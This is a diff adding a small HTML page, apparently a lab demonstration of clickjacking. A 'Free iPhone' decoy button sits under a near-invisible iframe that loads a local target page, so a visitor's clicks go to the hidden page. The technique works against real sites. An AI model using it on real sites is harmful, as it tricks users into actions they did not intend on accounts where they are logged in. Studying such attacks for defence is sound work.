@@ -1,0 +1,34 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>Free iPhone</title>
+    <style>
+        iframe {
+            position: absolute;
+            top: 10px;
+            left: 100px;
+            width: 800px;
+            height: 220px;
+            opacity: .01;
+            z-index: 100;
+            pointer-events: auto;
+        }
+
+        button {
+            position: absolute;
+            top: 100px;
+            left: 100px;
+            z-index: 2;
+            padding: 20px;
+            font-size: 20px;
+        }
+    </style>
+</head>
+<body>
+    <h1>🎁 Click to Win iPhone</h1>
+
+    <!-- Clickjacking Setup -->
+    <iframe src="http://localhost:8000/target.php"></iframe>
+    <button>Click to Claim Prize</button>
+</body>
+</html>
